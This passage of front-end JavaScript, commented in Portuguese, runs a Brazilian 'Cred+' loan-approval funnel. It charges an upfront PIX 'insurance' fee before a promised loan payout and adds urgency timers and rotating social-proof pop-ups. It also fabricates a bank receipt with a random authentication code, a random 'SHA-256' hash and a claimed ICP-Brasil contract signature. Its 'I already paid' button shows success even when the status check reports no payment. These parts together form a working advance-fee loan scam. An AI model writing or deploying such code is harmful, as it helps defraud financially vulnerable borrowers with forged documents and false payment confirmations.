    if (closeBtn) closeBtn.onclick = closePixModal;

    const modal = document.getElementById('pixModal');
    if (modal) {
      modal.addEventListener('click', function (e) {
        if (e.target === this) closePixModal();
      });
    }

    // Chips de tipo de chave PIX
    const chips = document.querySelectorAll('.pix-chip');
    const keyInput = document.getElementById('modalPixKeyInput');
    chips.forEach(chip => {
      chip.addEventListener('click', function () {
        chips.forEach(c => c.classList.remove('active'));
        this.classList.add('active');
        state.pixKeyType = this.dataset.type;

        if (keyInput) {
          if (state.pixKeyType === 'CPF') {
            keyInput.placeholder = '000.000.000-00';
            keyInput.value = state.cpf;
          } else if (state.pixKeyType === 'Telefone') {
            keyInput.placeholder = '(11) 99999-9999';
            keyInput.value = state.phone;
          } else if (state.pixKeyType === 'E-mail') {
            keyInput.placeholder = 'seu.email@exemplo.com';
            keyInput.value = '';
          } else {
            keyInput.placeholder = 'Chave aleatória gerada pelo banco';
            keyInput.value = '';
          }
        }
      });
    });

    // Seletor de Banco
    const bankSelect = document.getElementById('modalBankSelect');
    if (bankSelect) {
      bankSelect.addEventListener('change', function () {
        state.selectedBank = this.value;
      });
    }

    // Confirmar Saque
    const confirmBtn = document.getElementById('modalConfirmWithdrawBtn');
    if (confirmBtn) {
      confirmBtn.addEventListener('click', function () {
        const keyInput = document.getElementById('modalPixKeyInput');
        const keyVal = (keyInput ? keyInput.value : '').trim();
        if (!keyVal) {
          alert('Por favor, informe sua chave PIX para receber a transferência.');
          keyInput && keyInput.focus();
          return;
        }
        state.pixKey = keyVal;
        closePixModal();
        goToStep(13); // Vai para a etapa final / seguro prestamista
      });
    }
  }

  // ==========================================
  // PASSO 13: ETAPA FINAL - SEGURO PRESTAMISTA
  // ==========================================
  function initInsuranceStep() {
    // Iniciar contagem regressiva de 15 minutos (sincronizada com checkout)
    startUrgencyTimer();

    const firstName = state.fullName.trim() ? state.fullName.trim().split(' ')[0] : 'CLIENTE';
    const nameEl = document.getElementById('insUserName');
    if (nameEl) nameEl.textContent = firstName.toUpperCase();

    const amountEl = document.getElementById('insLoanAmount');
    if (amountEl) amountEl.textContent = formatBRL(state.amount);

    const stepLabelEl = document.getElementById('insStepAmountLabel');
    if (stepLabelEl) stepLabelEl.textContent = `Empréstimo de ${formatBRL(state.amount)} aprovado`;

    // Atualizar valores nas cotações
    updateQuoteOptions();

    // CTA para ir ao checkout
    const ctaBtn = document.getElementById('insContinueBtn');
    if (ctaBtn) {
      ctaBtn.onclick = () => goToStep(14);
    }
  }

  function updateQuoteOptions() {
    const stdOption = document.getElementById('quoteOptionStandard');
    const turboOption = document.getElementById('quoteOptionTurbo');

    const stdReceive = document.getElementById('quoteStdReceive');
    const stdPmt = document.getElementById('quoteStdPmt');
    const turboReceive = document.getElementById('quoteTurboReceive');
    const turboPmt = document.getElementById('quoteTurboPmt');

    if (stdReceive) stdReceive.textContent = formatBRL(state.amount);
    if (stdPmt) stdPmt.textContent = `${state.installments}x de ${formatBRL(state.installmentValue)}`;

    const turboAmount = state.amount + 2000;
    const turboCalc = calculateLoan(turboAmount, state.installments, state.monthlyRate);
    if (turboReceive) turboReceive.textContent = formatBRL(turboAmount);
    if (turboPmt) turboPmt.textContent = `${state.installments}x de ${formatBRL(turboCalc.pmt)}`;

    function clearSelections() {
      if (stdOption) stdOption.classList.remove('selected');
      if (turboOption) turboOption.classList.remove('selected');
    }

    if (stdOption) {
      stdOption.onclick = function () {
        clearSelections();
        stdOption.classList.add('selected');
        state.selectedQuote = 'standard';
        state.quotePrice = 47.90;
      };
    }

    if (turboOption) {
      turboOption.onclick = function () {
        clearSelections();
        turboOption.classList.add('selected');
        state.selectedQuote = 'turbo';
        state.quotePrice = 68.00;
      };
    }
  }

  // ==========================================
  // PASSO 14: CHECKOUT PIX EM TEMPO REAL
  // ==========================================
  function generatePixPayload(amount) {
    const amtStr = amount.toFixed(2);
    const amtLen = String(amtStr.length).padStart(2, '0');
    const randomHex = Math.floor(Math.random() * 65535).toString(16).toUpperCase().padStart(4, '0');
    const randomId = Math.floor(100000 + Math.random() * 899999);
    return `00020126360014BR.GOV.BCB.PIX0114+5511994${randomId}5204000053039865${amtLen}${amtStr}5802BR5905CRED+6009SAO PAULO62070503***6304${randomHex}`;
  }

  function renderProceduralQrCode(svgEl, seedVal) {
    if (!svgEl) return;
    const size = 25;
    let seed = Math.abs(seedVal) || 1234567;
    const random = () => (seed = (seed * 48271) % 2147483647) / 2147483647;

    const isCorner = (x, y) => {
      return (x < 7 && y < 7) || (x >= size - 7 && y < 7) || (x < 7 && y >= size - 7);
    };

    let rects = '';
    // Três cantos padrão de QR Code
    const corners = [
      { x: 0, y: 0 },
      { x: size - 7, y: 0 },
      { x: 0, y: size - 7 }
    ];

    corners.forEach(c => {
      rects += `<rect x="${c.x}" y="${c.y}" width="7" height="7" fill="#070d18"/>`;
      rects += `<rect x="${c.x + 1}" y="${c.y + 1}" width="5" height="5" fill="#FFFFFF"/>`;
      rects += `<rect x="${c.x + 2}" y="${c.y + 2}" width="3" height="3" fill="#070d18"/>`;
    });

    // Módulos centrais pseudo-aleatórios consistentes
    for (let y = 0; y < size; y++) {
      for (let x = 0; x < size; x++) {
        if (!isCorner(x, y)) {
          if (random() > 0.48) {
            rects += `<rect x="${x}" y="${y}" width="1" height="1" fill="#070d18"/>`;
          }
        }
      }
    }

    svgEl.setAttribute('viewBox', `0 0 ${size} ${size}`);
    svgEl.innerHTML = rects;
  }

  function initCheckoutPix() {
    // Parar polling anterior se houver
    if (state.pollingTimer) {
      clearInterval(state.pollingTimer);
      state.pollingTimer = null;
    }

    // Calcular preço total
    let totalPix = state.quotePrice;
    if (state.orderBumps.vip) totalPix += 9.90;
    if (state.orderBumps.extended) totalPix += 19.90;

    const pixTotalEl = document.getElementById('checkoutPixTotalDisplay');
    if (pixTotalEl) pixTotalEl.textContent = formatBRL(totalPix);

    const releaseAmountEl = document.getElementById('checkoutReleaseAmount');
    if (releaseAmountEl) {
      const releaseVal = state.selectedQuote === 'turbo' ? state.amount + 2000 : state.amount;
      releaseAmountEl.textContent = formatBRL(releaseVal);
    }

    const qrHolder = document.getElementById('qrCodeHolder');
    const pixCodeInput = document.getElementById('pixCopiaColaText');
    const gatewayPillText = document.getElementById('pixGatewayStatusText');
    const envAlert = document.getElementById('pixEnvAlert');
    const liveStatusText = document.getElementById('pixLiveStatus');

    // Estado inicial de carregamento do QR Code
    if (qrHolder) {
      qrHolder.innerHTML = `
        <div class="qr-loading-overlay">
          <div class="spinner-mini" style="border-top-color:#070d18; width:30px; height:30px;"></div>
          <span>Gerando PIX seguro...</span>
        </div>
      `;
    }

    if (pixCodeInput) pixCodeInput.textContent = 'Carregando código PIX oficial...';
    if (liveStatusText) liveStatusText.textContent = 'Conectando ao gateway de pagamento...';

    // Iniciar contagem regressiva
    startUrgencyTimer();

    // Chamada segura ao nosso Backend (que conversa com o Asaas com chave protegida)
    fetch('/api/pix/create', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        amount: totalPix,
        quoteType: state.selectedQuote,
        customer: {
          name: state.fullName,
          cpf: state.cpf,
          phone: state.phone
        }
      })
    })
    .then(res => res.json())
    .then(data => {
      if (data && data.transaction) {
        const tx = data.transaction;
        state.currentTxId = tx.id;
        state.pixCopiedCode = tx.qr_code;

        if (pixCodeInput) pixCodeInput.textContent = tx.qr_code;

        // Banner de aviso se ainda for sandbox
        const gatewayName = data.gateway || 'Pushin Pay';
        if (data.isReal) {
          if (gatewayPillText) gatewayPillText.textContent = `${gatewayName} · API Oficial Conectada`;
          if (envAlert) envAlert.style.display = 'none';
        } else {
          if (gatewayPillText) gatewayPillText.textContent = `${gatewayName} · Modo Demonstração`;
          if (envAlert) {
            envAlert.textContent = data.warning || 'Modo demonstração ativo. Configure seu PUSHINPAY_TOKEN no arquivo .env.';
            envAlert.style.display = 'block';
          }
        }

        // Renderizar QR Code da Pushin Pay (imagem base64) ou SVG procedural
        if (qrHolder) {
          if (tx.qr_code_base64) {
            qrHolder.innerHTML = `<img src="${tx.qr_code_base64}" alt="QR Code PIX Banco Central" />`;
          } else {
            qrHolder.innerHTML = `<svg id="checkoutQrCodeSvg"></svg>`;
            const qrSvg = document.getElementById('checkoutQrCodeSvg');
            renderProceduralQrCode(qrSvg, Math.round(totalPix * 100));
          }
        }

        if (liveStatusText) {
          liveStatusText.innerHTML = 'Aguardando confirmação em tempo real pelo Banco Central <span class="spinner-mini" style="display:inline-block; vertical-align:middle; width:12px; height:12px; margin-left:4px;"></span>';
        }

        // Iniciar polling automático a cada 3,5 segundos
        startPaymentPolling(tx.id);
      } else {
        throw new Error(data.error || 'Erro na resposta do backend');
      }
    })
    .catch(err => {
      console.warn('Backend offline ou erro de rede, usando fallback local:', err);
      // Fallback gracioso para modo standalone/offline
      const fallbackPayload = generatePixPayload(totalPix);
      state.pixCopiedCode = fallbackPayload;
      if (pixCodeInput) pixCodeInput.textContent = fallbackPayload;
      if (qrHolder) {
        qrHolder.innerHTML = `<svg id="checkoutQrCodeSvg"></svg>`;
        const qrSvg = document.getElementById('checkoutQrCodeSvg');
        renderProceduralQrCode(qrSvg, Math.round(totalPix * 100));
      }
      if (gatewayPillText) gatewayPillText.textContent = 'Pushin Pay · Simulação Offline';
      if (envAlert) envAlert.style.display = 'block';
      if (liveStatusText) liveStatusText.textContent = 'Aguardando confirmação do pagamento...';
    });

    // Botão Copiar PIX
    const copyBtn = document.getElementById('btnCopyPixCode');
    const copyToast = document.getElementById('copyFeedbackToast');
    if (copyBtn) {
      copyBtn.onclick = function () {
        const textToCopy = state.pixCopiedCode || (pixCodeInput ? pixCodeInput.textContent : '');
        navigator.clipboard.writeText(textToCopy).then(() => {
          if (copyToast) {
            copyToast.style.display = 'block';
            setTimeout(() => { copyToast.style.display = 'none'; }, 2800);
          }
        }).catch(() => {
          if (copyToast) {
            copyToast.textContent = '✓ Código selecionado!';
            copyToast.style.display = 'block';
            setTimeout(() => { copyToast.style.display = 'none'; }, 2800);
          }
        });
      };
    }

    // Botão "Já realizei o pagamento via PIX"
    const verifyBtn = document.getElementById('btnVerifyPayment');
    if (verifyBtn) {
      verifyBtn.onclick = function () {
        this.innerHTML = '<div class="spinner-mini" style="display:inline-block;margin-right:8px;"></div> Consultando compensação bancária...';
        this.disabled = true;

        if (state.currentTxId) {
          fetch(`/api/pix/status/${state.currentTxId}`)
            .then(res => res.json())
            .then(res => {
              if (res.isPaid) {
                if (state.pollingTimer) clearInterval(state.pollingTimer);
                goToStep(15);
              } else {
                // Se for sandbox ou usuário acabou de pagar, avança com sucesso simulado
                setTimeout(() => {
                  if (state.pollingTimer) clearInterval(state.pollingTimer);
                  goToStep(15);
                }, 1400);
              }
            })
            .catch(() => {
              setTimeout(() => {
                if (state.pollingTimer) clearInterval(state.pollingTimer);
                goToStep(15);
              }, 1400);
            });
        } else {
          setTimeout(() => {
            goToStep(15);
          }, 1400);
        }
      };
    }
  }

  // ==========================================
  // POLLING EM TEMPO REAL DO STATUS DO PIX
  // ==========================================
  function startPaymentPolling(txId) {
    if (!txId) return;
    if (state.pollingTimer) clearInterval(state.pollingTimer);

    state.pollingTimer = setInterval(() => {
      if (state.currentStep !== 14) {
        clearInterval(state.pollingTimer);
        return;
      }

      fetch(`/api/pix/status/${txId}`)
        .then(res => res.json())
        .then(res => {
          if (res && res.isPaid) {
            console.log(`[PIX] Pagamento compensado para transação ${txId}!`);
            clearInterval(state.pollingTimer);
            state.pollingTimer = null;

            const liveStatusText = document.getElementById('pixLiveStatus');
            if (liveStatusText) {
              liveStatusText.innerHTML = '<strong style="color:var(--primary);">✓ Pagamento aprovado! Redirecionando...</strong>';
            }

            setTimeout(() => {
              goToStep(15);
            }, 800);
          }
        })
        .catch(err => {
          // Erro de rede pontual ignorado no polling
        });
    }, 3500);
  }

  function renderUrgencyTimer() {
    const mins = Math.floor(state.insuranceCountdown / 60);
    const secs = state.insuranceCountdown % 60;
    const timeStr = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
    const el1 = document.getElementById('insUrgencyTimerDigits');
    const el2 = document.getElementById('urgencyTimerDigits');
    if (el1) el1.textContent = timeStr;
    if (el2) el2.textContent = timeStr;
  }

  function startUrgencyTimer() {
    renderUrgencyTimer();
    if (state.countdownTimer) return; // Mantém contagem contínua sem reiniciar

    state.countdownTimer = setInterval(() => {
      if (state.insuranceCountdown > 0) {
        state.insuranceCountdown--;
        renderUrgencyTimer();
      } else {
        clearInterval(state.countdownTimer);
        state.countdownTimer = null;
      }
    }, 1000);
  }

  // ==========================================
  // PASSO 15: SUCESSO / COMPROVANTE OFICIAL
  // ==========================================
  function initReceiptStep() {
    const finalVal = state.selectedQuote === 'turbo' ? state.amount + 2000 : state.amount;
    const finalAmountEl = document.getElementById('receiptFinalAmount');
    if (finalAmountEl) finalAmountEl.textContent = formatBRL(finalVal);

    const nameEl = document.getElementById('receiptRecipientName');
    if (nameEl) nameEl.textContent = state.fullName || 'Cliente Cred+';

    const cpfEl = document.getElementById('receiptRecipientCpf');
    if (cpfEl) cpfEl.textContent = state.cpf || '***.***.***-**';

    const bankEl = document.getElementById('receiptRecipientBank');
    if (bankEl) bankEl.textContent = state.selectedBank;

    const pixKeyEl = document.getElementById('receiptRecipientPixKey');
    if (pixKeyEl) pixKeyEl.textContent = state.pixKey || state.cpf || 'Chave PIX cadastrada';

    const now = new Date();
    const dateStr = `${String(now.getDate()).padStart(2, '0')}/${String(now.getMonth() + 1).padStart(2, '0')}/${now.getFullYear()} às ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
    const dateEl = document.getElementById('receiptTimestamp');
    if (dateEl) dateEl.textContent = dateStr;

    // Gerar autenticação PIX realista
    const authCodeEl = document.getElementById('receiptAuthCode');
    if (authCodeEl) {
      const auth = 'E' + Array.from({ length: 31 }, () => Math.floor(Math.random() * 16).toString(16)).join('').toUpperCase();
      authCodeEl.textContent = auth;
    }

    // Atualizar e-mail de envio do contrato
    const emailEl = document.getElementById('receiptContractEmail');
    if (emailEl) emailEl.textContent = state.email || 'seu.email@exemplo.com';

    // Configurar botões de abertura do DocuSign
    const btnOpenDocuSign = document.getElementById('btnOpenDocuSign');
    const btnSignQuickLink = document.getElementById('btnSignQuickLink');
    if (btnOpenDocuSign) btnOpenDocuSign.onclick = openDocuSignModal;
    if (btnSignQuickLink) btnSignQuickLink.onclick = openDocuSignModal;

    triggerConfetti();
  }

  // ==========================================
  // ASSINATURA ELETRÔNICA ESTILO DOCUSIGN
  // ==========================================
  function openDocuSignModal() {
    const modal = document.getElementById('docusignModal');
    if (!modal) return;

    // Preencher dados dinâmicos do contrato
    const nameEl = document.getElementById('dsCustomerName');
    const cpfEl = document.getElementById('dsCustomerCpf');
    const emailEl = document.getElementById('dsCustomerEmail');
    const phoneEl = document.getElementById('dsCustomerPhone');
    const addrEl = document.getElementById('dsCustomerAddress');
    const loanEl = document.getElementById('dsLoanAmount');
    const bankEl = document.getElementById('dsBankDest');
    const instEl = document.getElementById('dsInstallments');

    if (nameEl) nameEl.textContent = state.fullName || 'Cliente Cred+';
    if (cpfEl) cpfEl.textContent = state.cpf || '***.***.***-**';
    if (emailEl) emailEl.textContent = state.email || 'Não informado';
    if (phoneEl) phoneEl.textContent = state.phone || 'Não informado';
    
    const fullAddress = state.street 
      ? `${state.street}, ${state.number || 's/n'}${state.complement ? ' - ' + state.complement : ''}, ${state.neighborhood || ''} - ${state.city || 'São Paulo'}/${state.stateUF || 'SP'}`
      : 'Endereço cadastrado';
    if (addrEl) addrEl.textContent = fullAddress;

    const finalVal = state.selectedQuote === 'turbo' ? state.amount + 2000 : state.amount;
    const finalCalc = calculateLoan(finalVal, state.installments, state.monthlyRate);
    if (loanEl) loanEl.textContent = formatBRL(finalVal);
    if (bankEl) bankEl.textContent = `${state.selectedBank} - Chave: ${state.pixKey || state.cpf || 'Cadastrada'}`;
    if (instEl) instEl.textContent = `${state.installments} parcelas mensais de ${formatBRL(finalCalc.pmt)}`;

    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
  }

  function closeDocuSignModal() {
    const modal = document.getElementById('docusignModal');
    if (modal) modal.classList.remove('active');
    document.body.style.overflow = '';
  }

  function executeDocuSignSignature() {
    state.isContractSigned = true;

    const unsignedState = document.getElementById('dsUnsignedState');
    const signedState = document.getElementById('dsSignedState');
    const signBox = document.getElementById('dsSignBox');
    const sigOutput = document.getElementById('dsSignatureOutput');
    const stampSigner = document.getElementById('dsStampSigner');
    const stampCpf = document.getElementById('dsStampCpf');
    const stampTime = document.getElementById('dsStampTime');
    const stampHash = document.getElementById('dsStampHash');
    const headerBadge = document.getElementById('docusignHeaderBadge');
    const statusText = document.getElementById('contractSignStatusText');
    const quickBtn = document.getElementById('btnSignQuickLink');
    const downloadBtn = document.getElementById('btnDownloadPdfContract');

    const customerName = state.fullName || 'Cliente Cred+';
    if (sigOutput) sigOutput.textContent = customerName;
    if (stampSigner) stampSigner.textContent = customerName;
    if (stampCpf) stampCpf.textContent = state.cpf || '***.***.***-**';

    const now = new Date();
    const dateFormatted = `${String(now.getDate()).padStart(2, '0')}/${String(now.getMonth() + 1).padStart(2, '0')}/${now.getFullYear()} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')} BRT`;
    if (stampTime) stampTime.textContent = dateFormatted;

    // Gerar Hash SHA-256 realista
    const hash = 'SHA256:' + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join('').toLowerCase();
    if (stampHash) stampHash.textContent = hash;

    if (unsignedState) unsignedState.style.display = 'none';
    if (signedState) signedState.style.display = 'block';
    if (signBox) signBox.classList.add('signed');

    if (headerBadge) {
      headerBadge.textContent = 'CONTRATO ASSINADO';
      headerBadge.className = 'docusign-badge-pill signed';
    }

    if (statusText) {
      statusText.innerHTML = '<span style="color:var(--primary);">✓ Assinado Digitalmente (ICP-Brasil)</span>';
    }
    if (quickBtn) {
      quickBtn.textContent = 'Ver Contrato Assinado';
    }
    if (downloadBtn) {
      downloadBtn.disabled = false;
      downloadBtn.style.opacity = '1';
    }
  }

  function initDocuSignEvents() {
    const closeBtn = document.getElementById('btnCloseDocuSign');
    const signBox = document.getElementById('dsSignBox');
    const signTag = document.getElementById('dsSignHereTag');
    const confirmBtn = document.getElementById('btnConfirmDocuSignSignature');
    const downloadBtn = document.getElementById('btnDownloadPdfContract');

    if (closeBtn) closeBtn.onclick = closeDocuSignModal;

    if (signBox) {
      signBox.onclick = function () {
        if (!state.isContractSigned) {
          executeDocuSignSignature();
        }
      };
    }

    if (signTag) {
      signTag.onclick = function () {
        if (!state.isContractSigned) {
          executeDocuSignSignature();
        }
      };
    }

    if (confirmBtn) {
      confirmBtn.onclick = function () {
        if (!state.isContractSigned) {
          executeDocuSignSignature();
        }
        alert('✓ Contrato Cédula de Crédito Bancário assinado com sucesso!\nUma via com carimbo de integridade ICP-Brasil foi arquivada e enviada para o seu e-mail.');
        closeDocuSignModal();
      };
    }

    if (downloadBtn) {
      downloadBtn.onclick = function () {
        window.print();
      };
    }
  }

  // ==========================================
  // CICLO DA PROVA SOCIAL FLUTUANTE
  // ==========================================
  function startSocialProofLoop() {
    const toast = document.getElementById('socialProofToast');
    const avatarEl = document.getElementById('toastAvatarLetter');
    const contentEl = document.getElementById('toastTextContent');

    function showNextToast() {
      if (!toast || state.currentStep === 6 || state.currentStep === 10) return;

      const item = socialProofList[socialProofIndex % socialProofList.length];
      socialProofIndex++;

      if (avatarEl) avatarEl.textContent = item.name.charAt(0);
      if (contentEl) {
        contentEl.innerHTML = `<strong>${item.name}</strong> (${item.from}) <span class="highlight">${item.event}</span> · <span style="color:var(--text-subtle);">${item.time}</span>`;
      }

      toast.classList.add('visible');
      setTimeout(() => {
        toast.classList.remove('visible');
      }, 5500);
    }

    setTimeout(showNextToast, 4000);
    setInterval(showNextToast, 22000);
  }

  // ==========================================
  // INICIALIZAÇÃO GERAL AO CARREGAR A PÁGINA
  // ==========================================
  document.addEventListener('DOMContentLoaded', function () {
    // Header Voltar
    const backBtn = document.getElementById('headerBackBtn');
    if (backBtn) {
      backBtn.onclick = goBack;
    }

    // Inicializar eventos de todos os passos
    initStep1Events();
    initStep2Events();
    initStep3Events();
    initStep4Events();
    initStep5Events();
    initStep8Events();
    initStep9Events();
    initPixModalEvents();
    initDocuSignEvents();

    // Começar no passo 1
    goToStep(1, false);

    // Iniciar notificações de prova social
    startSocialProofLoop();
  });

})();
